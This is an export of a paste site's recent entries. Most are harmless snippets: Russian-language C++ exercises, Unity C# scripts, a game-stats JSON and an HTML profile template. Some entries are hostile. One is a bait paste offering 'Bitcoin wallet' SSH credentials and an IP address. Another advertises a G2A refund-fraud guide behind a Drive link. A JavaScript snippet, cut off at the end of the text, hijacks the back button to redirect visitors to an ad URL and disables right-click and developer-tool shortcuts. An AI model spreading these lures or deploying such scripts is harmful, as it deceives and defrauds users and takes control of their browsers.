id,title,username,language,date,content
sQN8367x,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Saturday 23rd of December 2023 12:04:05 AM CDT,"Dear Moe,
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-780441"
zkbSL09n,Untitled,35657,C++,Saturday 23rd of December 2023 12:01:10 AM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    double cost; // цена товара (вещественное число)
    int count; // количество товара (целое число)
    double discount; // скидка 5 процентов

    cout << ""Введите цену товара: "";
    cin >> cost;

    cout << ""Введите количество товара: "";
    cin >> count;

    cout << ""Введите размер скидки: "";
    cin >> discount;

    double price = cost * count * (1 - discount);

    cout << ""Стоимость товара  с учетом скидки: "" << price << endl;
}


"
DPdQSz5f,Untitled,35657,C++,Friday 22nd of December 2023 11:54:29 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    double cost = 10.5; // цена товара (вещественное число)
    int count = 5; // количество товара (целое число)
    double discount = 0.05; // скидка 5 процентов

    double price = cost * count * (1 - discount);

    cout << ""Стоимость товара  с учетом скидки: "" << price << endl;
}


"
QFhap8n7,Crate.cs,DugganSC,C#,Friday 22nd of December 2023 11:54:24 PM CDT,"using System.Collections;
using System.Collections.Generic;
using UnityEngine;

namespace Game.Scripts.LiveObjects
{
    public class Crate : MonoBehaviour
    {
        [SerializeField] private float _punchDelay;
        [SerializeField] private GameObject _wholeCrate, _brokenCrate;
        [SerializeField] private Rigidbody[] _pieces;
        [SerializeField] private BoxCollider _crateCollider;
        [SerializeField] private InteractableZone _interactableZone;
        private bool _isReadyToBreak = false;

        private List<Rigidbody> _breakingPieces = new List<Rigidbody>();
        private float _holdStarted = 0;
        [SerializeField] private float _holdDelay = 0.5f;

        private void OnEnable()
        {
            InteractableZone.onZoneInteractionComplete += InteractableZone_onZoneInteractionComplete;
            InteractableZone.onHoldStarted += InteractableZone_onHoldStarted;
            InteractableZone.onHoldEnded += InteractableZone_onHoldEnded;
        }

        private void InteractableZone_onHoldStarted(int obj)
        {
            if (_isReadyToBreak)
            {
                Debug.Log(""Hold started"");

                _holdStarted = Time.time;
            }
        }

        private void InteractableZone_onHoldEnded(int obj)
        {
            if (_isReadyToBreak)
            {
                Debug.Log(""Hold ended"");
                if (_holdStarted <= Time.time + _holdDelay)
                {
                    int parts = Random.Range(3, 6);
                    for (int i = 0; i < parts; i++)
                    {
                        BreakPart();
                    }
                }
                else
                {
                    // Otherwise, single strike
                    BreakPart();
                }
            }
        }

        private void InteractableZone_onZoneInteractionComplete(InteractableZone zone)
        {
            Debug.Log(""Interaction Zone complete"");
            if (_isReadyToBreak == false && _breakingPieces.Count >0)
            {
                _wholeCrate.SetActive(false);
                _brokenCrate.SetActive(true);
                _isReadyToBreak = true;
            }            
        }

        private void Start()
        {
            _breakingPieces.AddRange(_pieces);            
        }



        public void BreakPart()
        {
            if (_breakingPieces.Count > 0)
            {
                int rng = Random.Range(0, _breakingPieces.Count);
                _breakingPieces[rng].constraints = RigidbodyConstraints.None;
                _breakingPieces[rng].AddForce(new Vector3(1f, 1f, 1f), ForceMode.Force);
                _breakingPieces.Remove(_breakingPieces[rng]);
            } else
            {
                _isReadyToBreak = false;
                _crateCollider.enabled = false;
                _interactableZone.CompleteTask(6);
                Debug.Log(""Completely Busted"");
            }
        }

        IEnumerator PunchDelay()
        {
            float delayTimer = 0;
            while (delayTimer < _punchDelay)
            {
                yield return new WaitForEndOfFrame();
                delayTimer += Time.deltaTime;
            }

            _interactableZone.ResetAction(6);
        }

        private void OnDisable()
        {
            InteractableZone.onZoneInteractionComplete -= InteractableZone_onZoneInteractionComplete;
        }
    }
}
"
8cmNrvzn,InteractableZone.cs,DugganSC,C#,Friday 22nd of December 2023 11:53:50 PM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Game.Scripts.UI;


namespace Game.Scripts.LiveObjects
{
    public class InteractableZone : MonoBehaviour
    {
        private enum ZoneType
        {
            Collectable,
            Action,
            HoldAction
        }

        private enum KeyState
        {
            Press,
            PressHold
        }

        [SerializeField]
        private ZoneType _zoneType;
        [SerializeField]
        private int _zoneID;
        [SerializeField]
        private int _requiredID;
        [SerializeField]
        [Tooltip(""Press the (---) Key to ....."")]
        private string _displayMessage;
        [SerializeField]
        private GameObject[] _zoneItems;
        private bool _inZone = false;
        private bool _itemsCollected = false;
        private bool _actionPerformed = false;
        [SerializeField]
        private Sprite _inventoryIcon;
        [SerializeField]
        private KeyCode _zoneKeyInput;
        [SerializeField]
        private KeyState _keyState;
        [SerializeField]
        private GameObject _marker;

        private PlayerInputs _playerInput;

        private bool _inHoldState = false;

        private static int _currentZoneID = 0;
        public static int CurrentZoneID
        { 
            get 
            { 
               return _currentZoneID; 
            }
            set
            {
                _currentZoneID = value; 
                         
            }
        }


        public static event Action<InteractableZone> onZoneInteractionComplete;
        public static event Action<int> onHoldStarted;
        public static event Action<int> onHoldEnded;

        private void OnEnable()
        {
            InteractableZone.onZoneInteractionComplete += SetMarker;
            _playerInput = new PlayerInputs();
            _playerInput.Player.Enable();
            _playerInput.Player.Interact.performed += Interact_performed;
            _playerInput.Player.Interact.canceled += Interact_canceled;
        }

        private void Interact_canceled(UnityEngine.InputSystem.InputAction.CallbackContext obj)
        {
            if (_inZone == true)
            {
                if (_keyState == KeyState.PressHold)
                {
                    _inHoldState = false;
                    onHoldEnded?.Invoke(_zoneID);
                }
            }
        }

        private void Interact_performed(UnityEngine.InputSystem.InputAction.CallbackContext obj)
        {
            if (_inZone == true)
            {
                if (_keyState != KeyState.PressHold)
                {
                    //press
                    switch (_zoneType)
                    {
                        case ZoneType.Collectable:
                            if (_itemsCollected == false)
                            {
                                CollectItems();
                                _itemsCollected = true;
                                UIManager.Instance.DisplayInteractableZoneMessage(false);
                            }
                            break;

                        case ZoneType.Action:
                            if (_actionPerformed == false)
                            {
                                PerformAction();
                                _actionPerformed = true;
                                UIManager.Instance.DisplayInteractableZoneMessage(false);
                            }
                            break;
                    }
                }

                else if (_keyState == KeyState.PressHold && _inHoldState == false)
                {
                    _inHoldState = true;

                    switch (_zoneType)
                    {
                        case ZoneType.HoldAction:
                            PerformHoldAction();
                            break;
                    }
                }
            }
        }

        private void OnTriggerEnter(Collider other)
        {
            string _interactKeyName = _playerInput.Player.Interact.bindings[0].ToDisplayString();
            if (other.CompareTag(""Player"") && _currentZoneID > _requiredID)
            {
                switch (_zoneType)
                {
                    case ZoneType.Collectable:
                        if (_itemsCollected == false)
                        {
                            _inZone = true;
                            if (_displayMessage != null)
                            {
                                string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                                UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                            }
                            else
                                UIManager.Instance.DisplayInteractableZoneMessage(true, $""Press the {_interactKeyName} key to collect"");
                        }
                        break;

                    case ZoneType.Action:
                        if (_actionPerformed == false)
                        {
                            _inZone = true;
                            if (_displayMessage != null)
                            {
                                string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                                UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                            }
                            else
                                UIManager.Instance.DisplayInteractableZoneMessage(true, $""Press the {_interactKeyName} key to perform action"");
                        }
                        break;

                    case ZoneType.HoldAction:
                        _inZone = true;
                        if (_displayMessage != null)
                        {
                            string message = $""Press the {_interactKeyName} key to {_displayMessage}."";
                            UIManager.Instance.DisplayInteractableZoneMessage(true, message);
                        }
                        else
                            UIManager.Instance.DisplayInteractableZoneMessage(true, $""Hold the {_interactKeyName} key to perform action"");
                        break;
                }
            }
        }

        private void Update()
        {
        }
       
        private void CollectItems()
        {
            foreach (var item in _zoneItems)
            {
                item.SetActive(false);
            }

            UIManager.Instance.UpdateInventoryDisplay(_inventoryIcon);

            CompleteTask(_zoneID);

            onZoneInteractionComplete?.Invoke(this);

        }

        private void PerformAction()
        {
            foreach (var item in _zoneItems)
            {
                item.SetActive(true);
            }

            if (_inventoryIcon != null)
                UIManager.Instance.UpdateInventoryDisplay(_inventoryIcon);

            onZoneInteractionComplete?.Invoke(this);
        }

        private void PerformHoldAction()
        {
            UIManager.Instance.DisplayInteractableZoneMessage(false);
            onHoldStarted?.Invoke(_zoneID);
        }

        public GameObject[] GetItems()
        {
            return _zoneItems;
        }

        public int GetZoneID()
        {
            return _zoneID;
        }

        public void CompleteTask(int zoneID)
        {
            if (zoneID == _zoneID)
            {
                _currentZoneID++;
                onZoneInteractionComplete?.Invoke(this);
            }
        }

        public void ResetAction(int zoneID)
        {
            if (zoneID == _zoneID)
                _actionPerformed = false;
        }

        public void SetMarker(InteractableZone zone)
        {
            if (_zoneID == _currentZoneID)
                _marker.SetActive(true);
            else
                _marker.SetActive(false);
        }

        private void OnTriggerExit(Collider other)
        {
            if (other.CompareTag(""Player""))
            {
                _inZone = false;
                UIManager.Instance.DisplayInteractableZoneMessage(false);
            }
        }

        private void OnDisable()
        {
            InteractableZone.onZoneInteractionComplete -= SetMarker;
        }       
        
    }
}


"
tFxe6yK9,Untitled,35657,C++,Friday 22nd of December 2023 11:30:21 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы

    // однострочный комментарий

    /*
    Многострочный
    комментарий
    ...
    ...
    ...
    */
    
    int a; // объявление целочисленной переменной под названием a

    a = 5; // инициализация (определение) переменной

    int b = 6; // объявление и инициализация переменной

    double c = 8.56; // объявление и определение переменной - вещественного числа

    char d = 'c'; // объявление символьной переменной d
    
    bool e = true; // объявление булевой (логической переменной)

    b = 10; // значение переменной можно изменять

    const int days_number = 7; // объявление целочисленной константы

    // days_number = 10; // значение константы изменить нельзя

    cout << a << endl; // переменную можно вывести в консоль

    cout << a << "" "" << b << "" "" << c << endl; // можно вывести сразу несколько переменных

    int result = a + b * 3; // можно инициализировать переменную результатом вычисления какого-либо выражения.

    cout << result << endl;

    cout << a + 35 << endl; // можно вывести результат выражения 
}


"
eM7LBY0d,Untitled,35657,C++,Friday 22nd of December 2023 11:01:51 PM CDT,"
#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru""); // для использования кириллицы
    cout << ""Иванов Иван Иванович\n"";
    cout << ""Иванов\\Иван\\Иванович\n"";
    cout << ""Иванов\nИван\nИванович\n"";
    cout << ""\""Иванов\""\n\""Иван\""\n\""Иванович\""\n"";
}


"
ntviQ8yU,G2A.com Refund Exploit Dec 2023,G2ARefundExploit,GetText,Friday 22nd of December 2023 10:52:18 PM CDT,"G2A refund exploit updated guide - any item for free on G2A.com

https://drive.google.com/file/d/1AKxSk9vs38aBF7GEDJxf8mNi-_NVRLQ9/view#g2a_refund_exploit.pdf

Working as of 
22 December 2023

878196"
J0RtAajg,maple api 1,hw0k,JSON,Friday 22nd of December 2023 10:22:34 PM CDT,"{
  ""date"": ""2023-12-21T00:00+09:00"",
  ""character_class"": ""데몬어벤져"",
  ""final_stat"": [
    {
      ""stat_name"": ""최소 스탯공격력"",
      ""stat_value"": ""8486729""
    },
    {
      ""stat_name"": ""최대 스탯공격력"",
      ""stat_value"": ""9429697""
    },
    {
      ""stat_name"": ""데미지"",
      ""stat_value"": ""93.00""
    },
    {
      ""stat_name"": ""보스 몬스터 데미지"",
      ""stat_value"": ""138.00""
    },
    {
      ""stat_name"": ""최종 데미지"",
      ""stat_value"": ""26.50""
    },
    {
      ""stat_name"": ""방어율 무시"",
      ""stat_value"": ""81.87""
    },
    {
      ""stat_name"": ""크리티컬 확률"",
      ""stat_value"": ""90""
    },
    {
      ""stat_name"": ""크리티컬 데미지"",
      ""stat_value"": ""52.00""
    },
    {
      ""stat_name"": ""상태이상 내성"",
      ""stat_value"": ""11""
    },
    {
      ""stat_name"": ""스탠스"",
      ""stat_value"": ""100""
    },
    {
      ""stat_name"": ""방어력"",
      ""stat_value"": ""25608""
    },
    {
      ""stat_name"": ""이동속도"",
      ""stat_value"": ""160""
    },
    {
      ""stat_name"": ""점프력"",
      ""stat_value"": ""123""
    },
    {
      ""stat_name"": ""스타포스"",
      ""stat_value"": ""270""
    },
    {
      ""stat_name"": ""아케인포스"",
      ""stat_value"": ""1370""
    },
    {
      ""stat_name"": ""어센틱포스"",
      ""stat_value"": ""40""
    },
    {
      ""stat_name"": ""STR"",
      ""stat_value"": ""2585""
    },
    {
      ""stat_name"": ""DEX"",
      ""stat_value"": ""1869""
    },
    {
      ""stat_name"": ""INT"",
      ""stat_value"": ""1457""
    },
    {
      ""stat_name"": ""LUK"",
      ""stat_value"": ""1510""
    },
    {
      ""stat_name"": ""HP"",
      ""stat_value"": ""500000""
    },
    {
      ""stat_name"": ""MP"",
      ""stat_value"": null
    },
    {
      ""stat_name"": ""AP 배분 STR"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 DEX"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 INT"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 LUK"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""AP 배분 HP"",
      ""stat_value"": ""19935""
    },
    {
      ""stat_name"": ""AP 배분 MP"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""아이템 드롭률"",
      ""stat_value"": ""19""
    },
    {
      ""stat_name"": ""메소 획득량"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""버프 지속시간"",
      ""stat_value"": ""21""
    },
    {
      ""stat_name"": ""공격 속도"",
      ""stat_value"": ""4""
    },
    {
      ""stat_name"": ""일반 몬스터 데미지"",
      ""stat_value"": ""99.00""
    },
    {
      ""stat_name"": ""재사용 대기시간 감소 (초)"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""재사용 대기시간 감소 (%)"",
      ""stat_value"": ""5""
    },
    {
      ""stat_name"": ""재사용 대기시간 미적용"",
      ""stat_value"": ""0""
    },
    {
      ""stat_name"": ""속성 내성 무시"",
      ""stat_value"": ""2.00""
    },
    {
      ""stat_name"": ""상태이상 추가 데미지"",
      ""stat_value"": ""6.00""
    },
    {
      ""stat_name"": ""무기 숙련도"",
      ""stat_value"": ""90""
    },
    {
      ""stat_name"": ""추가 경험치 획득"",
      ""stat_value"": ""30.00""
    },
    {
      ""stat_name"": ""공격력"",
      ""stat_value"": ""1727""
    },
    {
      ""stat_name"": ""마력"",
      ""stat_value"": ""597""
    },
    {
      ""stat_name"": ""전투력"",
      ""stat_value"": ""10500054""
    },
    {
      ""stat_name"": ""소환수 지속시간 증가"",
      ""stat_value"": ""8""
    }
  ],
  ""remain_ap"": 0
}"
FTYGkPWB,PokeCrossing (TH Character Profile Code),StarmanSymphony,HTML,Friday 22nd of December 2023 10:14:44 PM CDT,"<!--

    PokeCrossing
    A code by StarmanSymphony
    
    - You may edit this code to your liking.
    - You may frankenstein this code with others, as long as the other coder(s) allow it.
    - Do not move or remove the credit.
    - Remember to turn WYSIWYG off before using this code!
    - Created for Coders' Quarters' December 2023 challenge - layout by @/Togo!
    
    COLOURS USED (THAT AREN'T TYPE COLOURS):
    - #ffffff - Box background, icon border, header text
    - #000000 - Box text
    - #9c9c9c - Box borders
    - #8a8a8a - Header gradient, palette colour
    - #5c5c5c - Header gradient, palette colour
    - #343434 - Header gradient, palette colour
    - #d3d3d3 - Nav-pill text

-->


<div class=""mx-auto"" style=""max-width:800px"">
    <div class=""card p-2 border-0"" style=""background:url(LINK - CAN BE REPLACE WITH SOLID COLOUR OR GRADIENT)"">
        
        <!-- ROW 1 -->
        <div class=""row no-gutters mb-3"">
            <!-- ICON -->
            <div class=""col-3 d-none d-md-block"">
                <img src=""IMAGE LINK"" style=""height:200px;width:200px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70); border:3px solid #ffffff;border-radius:100px"">
            </div>
            
            <!-- NAME + QUOTE -->
            <div class=""col-md-7 col-10 align-items-end pl-md-1"">
                <div class=""card card-block border-0"" style=""height:100px;border-radius:0px 100px 100px 100px; color:#ffffff;box-shadow:0 0px 7px 2px rgba(0,0,0,0.70); background:linear-gradient(to right, #8a8a8a, #5c5c5c)"">
                    <h1 style=""font-weight:bold"">Name</h1>
                    <p style=""font-size:.8em; text-align:right""><i>""A quote here. Keep it short! ""</i></p>
                </div>
            </div>
            
            <!-- TYPE -->
            <!-- Colours for types can be found here: https://toyhou.se/2621177.color-references-bs-pkmn- -->
            <div class=""col-2 align-items-end pl-1"">
                <div class=""card border-0 overflow-hidden"" style=""height:100px;width:130px;border-radius:100px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70);"">
                    <div class=""row no-gutters flex-fill flex-column"">
                        <div class=""col justify-content-center align-items-center text-light"" style=""background-color:#A8A878"">Normal</div>
                        <!-- <div class=""col justify-content-center align-items-center text-dark"" style=""background-color:#F8D030"">Electric</div> -->
                        <!-- Remove the (<!- ->) on the line above for dual typing! -->
                    </div>
                </div>
            </div>
        </div>
        
        <!-- ROW 2 -->
        <div class=""row no-gutters"">
            <!-- RELATIONS -->
            <div class=""col-md-3 col-4"">
                <div class=""ui-accordion card"" style=""border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                    <div class=""ui-accordion-content p-2"" style=""height:333px; background-color:#ffffff;color:#000000;border-radius:17px"">
                        <!-- CHARACTER 1 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                        
                        <!-- CHARACTER 2 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                        
                        <!-- CHARACTER 3 -->
                        <div class=""d-flex flex-row"" style=""margin-bottom:-5px"">
                            <span style=""font-weight:bold""><a href=""LINK"">Name</a></span>
                            <hr class=""mx-2"" style=""flex-grow:1;border:1px dashed"">
                            <span>Relation</span>
                        </div>
                        <p style=""font-size:.9em"">
                            <i>Write a bit about the characters' relationship.</i>
                        </p>
                    </div>
                </div>
            </div>
            
            <!-- PALETTE -->
            <div class=""col-md-9 col-8 pl-md-2 pl-1"">
                <div class=""card overflow-hidden border-0 mb-1"" style=""height:20px; border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                    <div class=""row no-gutters flex-fill"">
                        <div class=""col"" style=""background-color:#8a8a8a""></div>
                        <div class=""col"" style=""background-color:#5c5c5c""></div>
                        <div class=""col"" style=""background-color:#343434""></div>
                        <!-- Copy & Paste above line to add extra colours! -->
                    </div>
                </div>
                
                <!-- ROW 2.5 -->
                <div class=""row no-gutters"">
                    <!-- BOX 1 -->
                    <div class=""col-md-6"">
                        <div class=""ui-accordion card mt-1 mb-2"" style=""height:120px; border:3px solid #9c9c9c;border-radius:20px; background-color:#ffffff;color:#000000; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <!-- ABOUT -->
                            <div class=""ui-accordion-content p-1"" style=""border-radius:17px"">
                                <p>This is where you put your About text! This box will scroll if you add enough content. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin elit sed tellus blandit viverra sed eget odio. Donec accumsan tempor lacus, et venenatis elit feugiat non. Duis porta eros et velit blandit dapibus. Curabitur ac finibus eros. Duis placerat velit vitae massa sodales, eget mattis nibh pellentesque.</p>
                            </div>
                        </div>
                        
                        <!-- BOX 2-->
                        <!-- THE BOX -->
                        <div class=""ui-accordion card tab-content"" style=""height:130px; border:3px solid #9c9c9c;border-radius:20px; background-color:#ffffff;color:#000000; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <!-- BASICS -->
                            <div id=""BASIC"" class=""ui-accordion-content px-0 py-1 tab-pane active fade show"" style=""border-radius:17px"">
                                <div class=""row no-gutters"">
                                    <!-- COLUMN 1 -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Age: ##</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Gender: [Gender]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Pronouns: [Pro/nouns]</li>
                                        </ul>
                                        
                                    </div>
                                    
                                    <!-- COLUMN 2 -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Residence: [City, Region]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Orientation: [Orientation]</li>
                                        </ul>
                                        
                                    </div>
                                </div>
                            </div>
                            
                            <!-- BATTLE INFO -->
                            <div id=""BATTLE"" class=""ui-accordion-content px-0 py-1 tab-pane fade"" style=""border-radius:17px"">
                                <!-- NATURE/CHARACTERISTIC/ABILITY/HELD ITEM -->
                                <div class=""row no-gutters"" style=""margin-bottom:-7px"">
                                    <!-- NATURE + CHARACTERISTIC -->
                                    <div class=""col-6"">
                                        
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Nature: [Nature]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Characteristic: [Charac.]</li>
                                        </ul>
                                        
                                    </div>
                                    
                                    <!-- ABILITY + HELD ITEM -->
                                    <div class=""col-6"">
                                        <ul class=""fa-ul"" style=""margin-left:30px"">
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Ability: [Ability]</li>
                                            <li><span class=""fa-li""><i class=""fa-solid fa-bolt""></i></span>Held Item: [Item]</li>
                                        </ul>
                                    </div>
                                </div>
                                
                                <!-- MOVESET -->
                                <table class=""table text-center m-0 border-0"">
                                    <tr>
                                        <!-- Colours for types can be found here: https://toyhou.se/2621177.color-references-bs-pkmn- -->
                                        <!-- MOVE 1 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                        <!-- MOVE 2 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                    </tr>
                                    <tr>
                                        <!-- MOVE 3 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                        <!-- MOVE 4 -->
                                        <td class=""text-light"" style=""background-color:#A8A878"">
                                            <span style=""font-weight:bold"">Move Name</span>
                                            <br><span class=""float-left"">Status/Special/Physical</span> <span class=""float-right"">PP: ##</span>
                                        </td>
                                    </tr>
                                </table>
                                
                            </div>
                        </div>
                        
                        <!-- TABS -->
                        <ul class=""nav nav-pills nav-fill mt-1"" style=""background-color:#9c9c9c; border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            <li class=""nav-item"">
                                <a class=""nav-link active"" data-toggle=""tab"" aria-current=""page"" href=""#BASIC"" style=""color:#d3d3d3; mix-blend-mode:luminosity; border-radius:20px"">Basics</a>
                            </li>
                            
                            <li class=""nav-item"">
                                <a class=""nav-link"" data-toggle=""tab"" href=""#BATTLE"" style=""color:#d3d3d3; mix-blend-mode:luminosity; border-radius:20px"">Battle info</a>
                            </li>
                            </li>
                        </ul>
                    </div>
                    
                    <!-- DESKTOP DESIGN -->
                    <div class=""col-md-6 d-none d-md-block pl-md-2 mt-1"">
                        <div class=""card"" style=""height:310px; border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                            
                            <!-- REFERENCE IMAGE -->
                            <div class=""card border-0"" style=""height:160px; border-radius:17px 17px 0px 0px; background:url(IMAGE LINK) center;background-size:cover"">
                                <!-- IMAGE LINK -->
                                <a href=""IMAGE LINK"" data-toggle=""tooltip"" title=""Full reference"" style=""position:absolute; margin-left:260px;margin-top:130px"">
                                    <i class=""fa-solid fa-bolt""></i>
                                </a>
                            </div>
                            
                            <!-- DESIGN NOTES -->
                            <div class=""ui-accordion card"" style=""border:3px solid #9c9c9c;border-width: 3px 0px 0px 0px;border-radius:0px 0px 17px 17px;"">
                                <div class=""ui-accordion-content p-1"" style=""height:150px; border-radius:0px 0px 17px 17px; background-color:#ffffff;color:#000000;"">
                                    
                                    <ul class=""fa-ul"" style=""margin-left:25px"">
                                        <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>Design notes go here!</li>
                                        <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>This box will scroll if you add enough information.</li>
                                    </ul>
                                    
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
        </div>
        
        <!-- MOBILE DESIGN -->
        <div class=""d-md-none d-block mt-2"">
            <div class=""card"" style=""border:3px solid #9c9c9c;border-radius:20px; box-shadow:0 0px 7px 2px rgba(0,0,0,0.70)"">
                
                <!-- REFERENCE IMAGE -->
                <div class=""card border-0 rounded-0"" style=""height:160px; border-radius:17px 17px 0px 0px; background:url(IMAGE LINK) center;background-size:cover"">
                    <!-- IMAGE LINK -->
                    <a href=""IMAGE LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Full reference"" class=""align-self-end"">
                        <i class=""fa-solid fa-bolt""></i>
                    </a>
                </div>
                
                <!-- DESIGN NOTES -->
                <div class=""ui-accordion card p-1"" style=""min-height:100px; border:3px solid #9c9c9c;border-width: 3px 0px 0px 0px; border-radius:0px 0px 17px 17px; background-color:#ffffff;color:#000000"">
                    
                        <ul class=""fa-ul"" style=""margin-left:25px"">
                            <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>Design notes go here!</li>
                            <li><span class=""fa-li""><i class=""fa-solid fa-angles-right""></i></span>This box will grow if you add enough information.</li>
                        </ul>
                    
                </div>
            </div>
        </div>
        
    </div>
    
    <div class=""card border-0 mt-2 d-flex flex-row justify-content-between"">
        <!-- ICON CREDIT -->
        <a href=""CREDIT LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Icon by [CREDIT]"">
            <i class=""fa-solid fa-user""></i>
        </a>
            
        <!-- BACKGROUND CREDIT: REMOVE IF USING SOLID COLOUR OR GRADIENT -->
        <a href=""CREDIT LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Background by/from [CREDIT]"">
            <i class=""fa-solid fa-image""></i>
        </a>
            
        <!-- CODE CREDIT: DO NOT REMOVE -->
        <a href=""IMAGE LINK"" data-toggle=""tooltip"" data-placement=""auto"" title=""Code by StarmanSymphony"">
            <i class=""fa-solid fa-star""></i>
        </a>
    </div>
        
</div>"
TDMFkfJ5,TonfaiChores,tonfain,C++,Friday 22nd of December 2023 09:19:32 PM CDT,"#include <bits/stdc++.h>
using namespace std;

int main(){
	ifstream fin(""chores.in"");
	
	int N, L;
	fin >> N >> L;
	vector<int> lis;
	for(int i = 0; i<L; i++){
		int a; fin >> a;
		lis.push_back(a);
	}
	
	int num_out = 0;
	int c = 1;
	int l = 0;
	int cnt;
	
	//preset all elements in in to true
	bool in[N];
	for(int i = 1; i<=N; i++){
		in[i] = true;
	}
	//cout << ""test"" << endl;
	
	while(num_out < N-1){
		cnt = lis[l];
		//cout << cnt;
		while(cnt > 1){
			if(c > N){
				c = 1;
			}
			if(!in[c]){
				c++;
				//continue;
			}else{
				//in
				cnt--;
				c++;
				
			}
			//in
			//cnt--;
			//c++;
		}
		
		while(!in[c]){
			c++;
			//c %= c;
			if(c > N){
				c = 1;
			}
			//cout << ""c: "" << c << endl;
		}
		if(c > N){ // mistake: need to do it one more time, 26 slipped through b/c this case didn't go through case where the final one is out
			c = 1;
		}
		in[c] = false;
		num_out++;
		
		//cout << ""turned false: "" << c << "", no. out: "" << num_out << endl;
		
		if(l < L-1){
			l++;
		}else{
			l = 0;
		}
	}
	
	for(int i = 1; i<=N; i++){
		//cout << in[i] << endl;
		if(in[i]){
			cout << i << endl;
			return 0;
		}
	}
}
"
CZEmBGjT,Anti Anti,JakRapp,JavaScript,Friday 22nd of December 2023 09:05:02 PM CDT,"<script type=""text/javascript"">
(function(window, location) {
history.replaceState(null, document.title, location.pathname+""#!/history"");
history.pushState(null, document.title, location.pathname);

window.addEventListener(""popstate"", function() {
  if(location.hash === ""#!/history"") {
    history.replaceState(null, document.title, location.pathname);
    setTimeout(function(){
      location.replace(""https://www.toprevenuegate.com/vq3bq787?key=b39f30d70f98b167307149f2e9d55ac0"");
    },0);
  }
}, false);
}(window, location));
</script>
    <script type=""text/javascript"">

    
    // Disable Right click
document.addEventListener('contextmenu', event => event.preventDefault());

// Disable key down
document.onkeydown = disableSelectCopy;


function disableSelectCopy(e) {
    // current pressed key
    var pressedKey = String.fromCharCode(e.keyCode).toLowerCase();
    if ((e.ctrlKey && (pressedKey == ""c"" || pressedKey == ""x"" || pressedKey == ""v"" || pressedKey == ""a"" || pressedKey == ""u""|| pressedKey == ""i""|| pressedKey == ""j"")) ||  e.keyCode == 123) {
